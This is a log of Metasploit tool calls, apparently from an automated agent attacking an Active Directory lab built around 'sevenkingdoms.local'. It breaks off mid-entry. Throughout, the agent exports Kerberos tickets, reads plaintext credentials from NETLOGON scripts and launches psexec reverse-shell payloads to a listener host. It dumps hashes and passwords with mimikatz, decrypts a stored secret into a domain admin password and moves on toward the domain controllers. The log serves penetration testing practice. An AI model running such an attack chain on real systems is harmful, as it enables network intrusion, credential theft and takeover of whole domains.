[00000000] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 3:33:40 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 

[00000001] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 3:33:40 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 

[00000002] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 12/17/2025 3:59:00 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : MSSQLSvc/castelblack.north.sevenkingdoms.local:1433 @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 

[00000003] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 3:56:20 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : cifs/winterfell.north.sevenkingdoms.local @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000004] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 3:33:43 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : ProtectedStorage/winterfell.north.sevenkingdoms.local @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000005] - 0x00000012 - aes256_hmac      
   Start/End/MaxRene
... (truncated)
```

---

#### ✅ msf_session_interact
*2025-12-17 11:59:35* | Target: `1` | Duration: 506ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"kiwi_cmd \"kerberos::list /export\""}
```

**Output:**
```

[00000000] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 3:33:40 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 
====================
Base64 of file : 0-60a10000-jon.snow@krbtgt~NORTH.SEVENKINGDOMS.LOCAL-NORTH.SEVENKINGDOMS.LOCAL.kirbi
====================
doIFiDCCBYSgAwIBBaEDAgEWooIEdjCCBHJhggRuMIIEaqADAgEFoRsbGU5PUlRI
LlNFVkVOS0lOR0RPTVMuTE9DQUyiLjAsoAMCAQKhJTAjGwZrcmJ0Z3QbGU5PUlRI
LlNFVkVOS0lOR0RPTVMuTE9DQUyjggQUMIIEEKADAgESoQMCAQKiggQCBIID/uKY
/WupJyZzNAseSWA3n5YSKYJvOv/1HeChMlr9s3FySeL27RrwJC8UO/ZuOX8p3uQV
rY1jkRCunsG5wLE3Tw1tPueyDx9GSOrc6yfGlCFKZsDCgS14/q6o/Q6Rn5rG9QdS
ki64WXf1H1CxA1vHRXqS9l4w9F4G+vpXR5puK83NgmBxKAD6Eg0wOfG53nk3VBV1
vVO6c2Lx7FCjljGAHV5lDNcWP7ifj5BfMveI+1RNzmt1veyeTNCh1NHnMqhdNr2L
SvU00dwqDzY+ZdWZbw40chjgAIKWin6duvjpmzUDL4uDBuWwi0NT1bCK7QM8SAe0
J9xFgA5VAUk9uT03OUfYhNZRmBez9NlHOIzu7nwyf4y+7YrdXMsoOpickgXlI3nE
J/8/Ocap5Cw4sk8JUji+s4NJUAJz6NOKT2RCtG0JDTBZS3Ey6U/wlyj0rydnNael
mX+gU9vHOfwGnUpqRwRK5ZVsutu9/D5pqv9U4vR4WYk9Zlp4ubTsz/XzrjQFFpcp
pGdgvXozQirOYUTQuAauLvSbJSj1qRJIUCXf5leR1VYrx2hDHCcg9dhNact5rBp2
/ZUaAYL6S/XvPEx83VV7nX2NMFtq40HolyOvIxsI52YkvebPk/V3/zjL1WrGyZl2
OqYZ0vqFpAdtphnpOvng/tI9iOApQUvf/XspYEdJl5frKjZiW9z81x079SX+1T51
PW5iJPBbZhvhI7HzVus8ll4+S8MQK53ijiNUoTa6Kud70YYR4pi/jhpBv4r1uwnI
kpTv3Tvxv3/J4JLnLbPR/JneyUB3UuT6BrYtAUQCvADOHQLshFMXKorczR/g9k1A
8T4bdQSuoagHz83zQn2Lb+3Os/nxghoR/4vFnWCFiIQe8l7osXW3T4O9ixHQrHNV
1TiP8qnUUb7VZjq3Ua/baSodYX+kZ12kkgVxCDkhT3cx9mqM0rzUhtXThIIE4q0D
MBKd3ly/wsuuRUInKH2nMQ7o02ebinfcSaSoVSvturKfuaiitwyR45dJLgoDsxMh
+biAdmXoD/Q9joC9Hrm9F+LwwCoqif4O5etRIl/k3iS9Wh1Imauu6YrcxmzchOy1
YPJKOws+WltFt7+/Hd6Fdy3Mhm8j7ihB5GNQTNbIOG/pTXbNU+MYhDaGWGUQlKry
PT9FEUVTuS3LarYkF054JMGZOBZvRAxeCvpl4hmCHSWNGQADXBWJPoKQNYvpdUY1
KdjTRisHy0ECp+3ABMTKREA+dc
... (truncated)
```

---

#### ✅ msf_session_interact
*2025-12-17 11:59:54* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"shell"}
```

**Output:**
```
Process 7872 created.
Channel 8 created.
Microsoft Windows [Version 10.0.17763.1935]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\jon.snow\Desktop>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:00:02* | Target: `1` | Duration: 511ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"powershell -ep bypass -c \"Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select SamAccountName\""}
```

**Output:**
```
powershell -ep bypass -c "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select SamAccountName"

```

---

#### ❌ msf_session_interact
*2025-12-17 12:00:08* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"dir \\\\winterfell.north.sevenkingdoms.local\\NETLOGON"}
```

**Output:**
```
Get-ADUser : The term 'Get-ADUser' is not recognized as the name of a cmdlet, function, script file, or operable 
program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties Does ...
+ ~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Get-ADUser:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 

C:\Users\jon.snow\Desktop>dir \\winterfell.north.sevenkingdoms.local\NETLOGON
 Volume in drive \\winterfell.north.sevenkingdoms.local\NETLOGON is Windows 2019
 Volume Serial Number is BA49-CE42

 Directory of \\winterfell.north.sevenkingdoms.local\NETLOGON

12/12/2025  01:35 AM    <DIR>          .
12/12/2025  01:35 AM    <DIR>          ..
12/12/2025  01:35 AM               165 script.ps1
12/12/2025  01:35 AM               869 secret.ps1
               2 File(s)          1,034 bytes
               2 Dir(s)  45,844,652,032 bytes free

C:\Users\jon.snow\Desktop>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:00:15* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"type \\\\winterfell.north.sevenkingdoms.local\\NETLOGON\\secret.ps1"}
```

**Output:**
```
type \\winterfell.north.sevenkingdoms.local\NETLOGON\secret.ps1
# cypher script
# $domain="sevenkingdoms.local"
# $EncryptionKeyBytes = New-Object Byte[] 32
# [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($EncryptionKeyBytes)
# $EncryptionKeyBytes | Out-File "encryption.key"
# $EncryptionKeyData = Get-Content "encryption.key"
# Read-Host -AsSecureString | ConvertFrom-SecureString -Key $EncryptionKeyData | Out-File -FilePath "secret.encrypted"

# secret stored :
$keyData = 177, 252, 228, 64, 28, 91, 12, 201, 20, 91, 21, 139, 255, 65, 9, 247, 41, 55, 164, 28, 75, 132, 143, 71, 62, 191, 211, 61, 154, 61, 216, 91
$secret="76492d1116743f0423413b16050a5345MgB8AGkAcwBDACsAUwArADIAcABRAEcARABnAGYAMwA3AEEAcgBFAEIAYQB2AEEAPQA9AHwAZQAwADgANAA2ADQAMABiADYANAAwADYANgA1ADcANgAxAGIAMQBhAGQANQBlAGYAYQBiADQAYQA2ADkAZgBlAGQAMQAzADAANQAyADUAMgAyADYANAA3ADAAZABiAGEAOAA0AGUAOQBkAGMAZABmAGEANAAyADkAZgAyADIAMwA="

# T.L.
C:\Users\jon.snow\Desktop>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:00:15* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"type \\\\winterfell.north.sevenkingdoms.local\\NETLOGON\\script.ps1"}
```

**Output:**
```
type \\winterfell.north.sevenkingdoms.local\NETLOGON\script.ps1
# fake script in netlogon with creds
$task = '/c TODO'
$taskName = "fake task"
$user = "NORTH\jeor.mormont"
$password = "_L0ngCl@w_"

# passwords in sysvol still ...
C:\Users\jon.snow\Desktop>
```

---

### Phase: exploitation

#### ✅ msf_module_execute
*2025-12-17 12:00:39* | Target: `10.50.0.22` | Duration: 1574ms

**Input:**
```json
{"type":"exploit","name":"windows/smb/psexec","options":{"RHOSTS":"10.50.0.22","SMBUser":"jeor.mormont","SMBPass":"_L0ngCl@w_","SMBDomain":"NORTH","PAYLOAD":"windows/x64/meterpreter/reverse_tcp","LHOST":"10.50.0.1","LPORT":"4445"}}
```

**Output:**
```
Module launched as job 3. Use msf_job_info to check status.
```

---

### Phase: enumeration

#### ✅ msf_sessions_list
*2025-12-17 12:00:45* | Duration: 5ms

**Input:**
```json
{}
```

**Output:**
```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  },
  {
    "id": "2",
    "type": "meterpreter",
    "info": "",
    "tunnel": "10.50.0.1:4445 -> 10.50.0.22:52944",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  }
]
```

---

### Phase: post_exploitation

#### ✅ msf_session_interact
*2025-12-17 12:00:52* | Target: `2` | Duration: 518ms

**Input:**
```json
{"id":2,"type":"meterpreter","command":"getuid"}
```

**Output:**
```
Server username: NT AUTHORITY\SYSTEM

```

---

#### ✅ msf_session_interact
*2025-12-17 12:00:53* | Target: `2` | Duration: 508ms

**Input:**
```json
{"id":2,"type":"meterpreter","command":"getprivs"}
```

**Output:**
```

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreatePermanentPrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeDelegateSessionUserImpersonatePrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeLockMemoryPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTcbPrivilege
SeTimeZonePrivilege
SeUndockPrivilege


```

---

#### ✅ msf_session_interact
*2025-12-17 12:01:01* | Target: `2` | Duration: 711ms

**Input:**
```json
{"id":2,"type":"meterpreter","command":"load kiwi"}
```

**Output:**
```
Loading extension kiwi...
```

---

#### ✅ msf_session_interact
*2025-12-17 12:01:06* | Target: `2` | Duration: 509ms

**Input:**
```json
{"id":2,"type":"meterpreter","command":"creds_all"}
```

**Output:**
```

  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username      Domain  NTLM                              SHA1                                      DPAPI
--------      ------  ----                              ----                                      -----
CASTELBLACK$  NORTH   7d3771df8a6124a6701960155a3495b8  e5c13e6159788ed30364a29fcd697beb4ed6f15c
jon.snow      NORTH   b8d76e56e9dac90539aff05e3ccb1755  1315aeb7efe3eed73b568094db32a90f2e24a248  d17b93d9e6b7cbf7c2a6763ab9500965
robb.stark    NORTH   831486ac7f26860c9e2f51ac91e1a07a  3bea28f1c440eed7be7d423cefebb50322ed7b6c  8f2cb3c0875b5e54e211a7668f965cf0
sql_svc       NORTH   84a5092f53390ea48d660be52b93b804  9fd961155e28b1c6f9b3859f32f4779ad6a06404  edde3ff06a21fac533c5cc3c61eee1f7

wdigest credentials
===================

Username      Domain  Password
--------      ------  --------
(null)        (null)  (null)
CASTELBLACK$  NORTH   (null)
jon.snow      NORTH   (null)
robb.stark    NORTH   (null)
sql_svc       NORTH   (null)

kerberos credentials
====================

Username      Domain                     Password
--------      ------                     --------
(null)        (null)                     (null)
CASTELBLACK$  north.sevenkingdoms.local  Z1\kY9H8\u(OzV#wEwbKYE]Kav)3yFo Izfgg@-Nt!n@E@e'c8(r=b>!3GY*sNrGX&sc<P.S)):Hg#S)LCqO:75e/
                                         u)Xx`i_!44-LqNe2`MH6o@xyzz.G)ud
castelblack$  NORTH.SEVENKINGDOMS.LOCAL  (null)
jon.snow      NORTH.SEVENKINGDOMS.LOCAL  (null)
robb.stark    NORTH.SEVENKINGDOMS.LOCAL  (null)
sql_svc       NORTH.SEVENKINGDOMS.LOCAL  YouWi
... (truncated)
```

---

#### ✅ msf_session_interact
*2025-12-17 12:01:27* | Target: `2` | Duration: 511ms

**Input:**
```json
{"id":2,"type":"meterpreter","command":"hashdump"}
```

**Output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4363b6dc0c95588964884d7e1dfea1f7:::

```

---

#### ✅ msf_session_interact
*2025-12-17 12:01:27* | Target: `2` | Duration: 511ms

**Input:**
```json
{"id":2,"type":"meterpreter","command":"shell"}
```

**Output:**
```
Process 7700 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1935]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:01:36* | Target: `2` | Duration: 509ms

**Input:**
```json
{"id":2,"type":"meterpreter","command":"net user robb.stark /domain"}
```

**Output:**
```
net user robb.stark /domain
The request will be processed at a domain controller for domain north.sevenkingdoms.local.

User name                    robb.stark
Full Name                    
Comment                      Robb Stark
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/12/2025 1:00:34 AM
Password expires             Never
Password changeable          12/13/2025 1:00:34 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   12/17/2025 4:00:41 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *Domain Users         *Stark                
The command completed successfully.


C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:01:42* | Target: `2` | Duration: 511ms

**Input:**
```json
{"id":2,"type":"meterpreter","command":"net user sql_svc /domain"}
```

**Output:**
```
net user sql_svc /domain
The request will be processed at a domain controller for domain north.sevenkingdoms.local.

User name                    sql_svc
Full Name                    
Comment                      sql service
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/12/2025 1:00:56 AM
Password expires             Never
Password changeable          12/13/2025 1:00:56 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   12/12/2025 1:32:20 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.


C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:01:54* | Target: `2` | Duration: 511ms

**Input:**
```json
{"id":2,"type":"meterpreter","command":"net group \"Domain Computers\" /domain"}
```

**Output:**
```
net group "Domain Computers" /domain
The request will be processed at a domain controller for domain north.sevenkingdoms.local.

Group name     Domain Computers
Comment        All workstations and servers joined to the domain

Members

-------------------------------------------------------------------------------
CASTELBLACK$             
The command completed successfully.


C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:02:06* | Target: `2` | Duration: 509ms

**Input:**
```json
{"id":2,"type":"meterpreter","command":"dir \\\\winterfell.north.sevenkingdoms.local\\C$"}
```

**Output:**
```
dir \\winterfell.north.sevenkingdoms.local\C$
Access is denied.

C:\Windows\system32>
```

---

#### ❌ msf_session_interact
*2025-12-17 12:02:15* | Target: `2` | Duration: 7ms

**Input:**
```json
{"id":2,"type":"meterpreter","command":"net use \\\\winterfell\\C$ /user:NORTH\\jeor.mormont _L0ngCl@w_"}
```

**Output:**
```
Error: MSF Error: true
```

---

#### ❌ msf_session_interact
*2025-12-17 12:02:19* | Target: `2` | Duration: 5ms

**Input:**
```json
{"id":2,"type":"meterpreter","command":"exit"}
```

**Output:**
```
Error: MSF Error: true
```

---

### Phase: enumeration

#### ✅ msf_sessions_list
*2025-12-17 12:02:24* | Duration: 13ms

**Input:**
```json
{}
```

**Output:**
```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  }
]
```

---

### Phase: exploitation

#### ✅ msf_module_execute
*2025-12-17 12:02:36* | Target: `10.50.0.22` | Duration: 1064ms

**Input:**
```json
{"type":"exploit","name":"windows/smb/psexec","options":{"RHOSTS":"10.50.0.22","SMBUser":"jeor.mormont","SMBPass":"_L0ngCl@w_","SMBDomain":"NORTH","PAYLOAD":"windows/x64/meterpreter/reverse_tcp","LHOST":"10.50.0.1","LPORT":"4446"}}
```

**Output:**
```
Module launched as job 4. Use msf_job_info to check status.
```

---

### Phase: enumeration

#### ✅ msf_sessions_list
*2025-12-17 12:02:41* | Duration: 4ms

**Input:**
```json
{}
```

**Output:**
```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  },
  {
    "id": "3",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4446 -> 10.50.0.22:52949",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  }
]
```

---

### Phase: exploitation

#### ✅ msf_module_execute
*2025-12-17 12:02:48* | Target: `10.50.0.11` | Duration: 1483ms

**Input:**
```json
{"type":"exploit","name":"windows/smb/psexec","options":{"RHOSTS":"10.50.0.11","SMBUser":"jeor.mormont","SMBPass":"_L0ngCl@w_","SMBDomain":"NORTH","PAYLOAD":"windows/x64/meterpreter/reverse_tcp","LHOST":"10.50.0.1","LPORT":"4447"}}
```

**Output:**
```
Module launched as job 5. Use msf_job_info to check status.
```

---

### Phase: enumeration

#### ✅ msf_sessions_list
*2025-12-17 12:02:54* | Duration: 4ms

**Input:**
```json
{}
```

**Output:**
```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  },
  {
    "id": "3",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4446 -> 10.50.0.22:52949",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  }
]
```

---

### Phase: post_exploitation

#### ✅ msf_session_interact
*2025-12-17 12:03:00* | Target: `3` | Duration: 514ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"shell"}
```

**Output:**
```
Process 4884 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1935]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:03:06* | Target: `3` | Duration: 509ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"nltest /dclist:north.sevenkingdoms.local"}
```

**Output:**
```
nltest /dclist:north.sevenkingdoms.local
Get list of DCs in domain 'north.sevenkingdoms.local' from '\\winterfell.north.sevenkingdoms.local'.
    winterfell.north.sevenkingdoms.local [PDC]  [DS] Site: Default-First-Site-Name
The command completed successfully

C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:03:13* | Target: `3` | Duration: 510ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"nltest /dclist:sevenkingdoms.local"}
```

**Output:**
```
nltest /dclist:sevenkingdoms.local
Get list of DCs in domain 'sevenkingdoms.local' from '\\kingslanding.sevenkingdoms.local'.
    kingslanding.sevenkingdoms.local [PDC]  [DS] Site: Default-First-Site-Name
The command completed successfully

C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:03:13* | Target: `3` | Duration: 509ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"net group \"Domain Admins\" /domain"}
```

**Output:**
```
net group "Domain Admins" /domain
The request will be processed at a domain controller for domain north.sevenkingdoms.local.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            eddard.stark             
The command completed successfully.


C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:03:21* | Target: `3` | Duration: 509ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"net localgroup administrators"}
```

**Output:**
```
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
NORTH\Domain Admins
NORTH\jeor.mormont
vagrant
The command completed successfully.


C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:03:41* | Target: `3` | Duration: 511ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"powershell -ep bypass -c \"$keyData = 177, 252, 228, 64, 28, 91, 12, 201, 20, 91, 21, 139, 255, 65, 9, 247, 41, 55, 164, 28, 75, 132, 143, 71, 62, 191, 211, 61, 154, 61, 216, 91; $secret='76492d1116743f0423413b16050a5345MgB8AGkAcwBDACsAUwArADIAcABRAEcARABnAGYAMwA3AEEAcgBFAEIAYQB2AEEAPQA9AHwAZQAwADgANAA2ADQAMABiADYANAAwADYANgA1ADcANgAxAGIAMQBhAGQANQBlAGYAYQBiADQAYQA2ADkAZgBlAGQAMQAzADAANQAyADUAMgAyADYANAA3ADAAZABiAGEAOAA0AGUAOQBkAGMAZABmAGEANAAyADkAZgAyADIAMwA='; $ss = ConvertTo-SecureString $secret -Key $keyData; $cred = New-Object System.Management.Automation.PSCredential('user',$ss); $cred.GetNetworkCredential().Password\""}
```

**Output:**
```
powershell -ep bypass -c "$keyData = 177, 252, 228, 64, 28, 91, 12, 201, 20, 91, 21, 139, 255, 65, 9, 247, 41, 55, 164, 28, 75, 132, 143, 71, 62, 191, 211, 61, 154, 61, 216, 91; $secret='76492d1116743f0423413b16050a5345MgB8AGkAcwBDACsAUwArADIAcABRAEcARABnAGYAMwA3AEEAcgBFAEIAYQB2AEEAPQA9AHwAZQAwADgANAA2ADQAMABiADYANAAwADYANgA1ADcANgAxAGIAMQBhAGQANQBlAGYAYQBiADQAYQA2ADkAZgBlAGQAMQAzADAANQAyADUAMgAyADYANAA3ADAAZABiAGEAOAA0AGUAOQBkAGMAZABmAGEANAAyADkAZgAyADIAMwA='; $ss = ConvertTo-SecureString $secret -Key $keyData; $cred = New-Object System.Management.Automation.PSCredential('user',$ss); $cred.GetNetworkCredential().Password"

```

---

#### ✅ msf_session_interact
*2025-12-17 12:03:50* | Target: `3` | Duration: 511ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"dir /s /b \\\\winterfell\\SYSVOL\\*.xml \\\\winterfell\\SYSVOL\\*.ps1 \\\\winterfell\\SYSVOL\\*.bat 2>nul"}
```

**Output:**
```
powerkingftw135

C:\Windows\system32>dir /s /b \\winterfell\SYSVOL\*.xml \\winterfell\SYSVOL\*.ps1 \\winterfell\SYSVOL\*.bat 2>nul
\\winterfell\SYSVOL\north.sevenkingdoms.local\scripts\script.ps1
\\winterfell\SYSVOL\north.sevenkingdoms.local\scripts\secret.ps1

C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:04:02* | Target: `3` | Duration: 510ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"net user /domain | findstr -i \"tyrion tywin\""}
```

**Output:**
```
net user /domain | findstr -i "tyrion tywin"

C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:04:09* | Target: `3` | Duration: 509ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"net user eddard.stark /domain"}
```

**Output:**
```
net user eddard.stark /domain
The request will be processed at a domain controller for domain north.sevenkingdoms.local.

User name                    eddard.stark
Full Name                    
Comment                      Eddard Stark
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/12/2025 1:00:29 AM
Password expires             Never
Password changeable          12/13/2025 1:00:29 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   12/17/2025 4:01:34 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *Domain Users         *Stark                
                             *Domain Admins        
The command completed successfully.


C:\Windows\system32>
```

---

### Phase: exploitation

#### ✅ msf_module_execute
*2025-12-17 12:04:18* | Target: `10.50.0.11` | Duration: 1360ms

**Input:**
```json
{"type":"exploit","name":"windows/smb/psexec","options":{"RHOSTS":"10.50.0.11","SMBUser":"eddard.stark","SMBPass":"powerkingftw135","SMBDomain":"NORTH","PAYLOAD":"windows/x64/meterpreter/reverse_tcp","LHOST":"10.50.0.1","LPORT":"4448"}}
```

**Output:**
```
Module launched as job 6. Use msf_job_info to check status.
```

---

### Phase: enumeration

#### ✅ msf_sessions_list
*2025-12-17 12:04:23* | Duration: 3ms

**Input:**
```json
{}
```

**Output:**
```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  },
  {
    "id": "3",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4446 -> 10.50.0.22:52949",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  }
]
```

---

### Phase: post_exploitation

#### ❌ msf_session_interact
*2025-12-17 12:04:31* | Target: `3` | Duration: 511ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"net user /domain"}
```

**Output:**
```
net user /domain
The request will be processed at a domain controller for domain north.sevenkingdoms.local.


User accounts for \\winterfell.north.sevenkingdoms.local

-------------------------------------------------------------------------------
Administrator            arya.stark               brandon.stark            
catelyn.stark            eddard.stark             Guest                    
hodor                    jeor.mormont             jon.snow                 
krbtgt                   rickon.stark             robb.stark               
samwell.tarly            sansa.stark              sql_svc                  
vagrant                  
The command completed with one or more errors.


C:\Windows\system32>
```

---

#### ✅ msf_session_interact
*2025-12-17 12:04:39* | Target: `3` | Duration: 510ms

**Input:**
```json
{"id":3,"type":"meterpreter","command":"net user /domain:sevenkingdoms.local"}
```

**Output:**
```
net user /domain:sevenkingdoms.local
You used an option with an invalid value.

The syntax of this command is:

NET USER
[username [password | *] [options]] [/DOMAIN]
         username {password | *} /ADD [options] [/DOMAIN]
         username [/DELETE] [/DOMAIN]
         username [/TIMES:{times | ALL}]
         username [/ACTIVE: {YES | NO}]

More help is available by typing NET HELPMSG 3505.


C:\Windows\system32>
```

---

### Phase: exploitation

#### ✅ msf_module_execute
*2025-12-17 12:04:46* | Target: `kingslanding.sevenkingdoms.local` | Duration: 52ms

**Input:**
```json
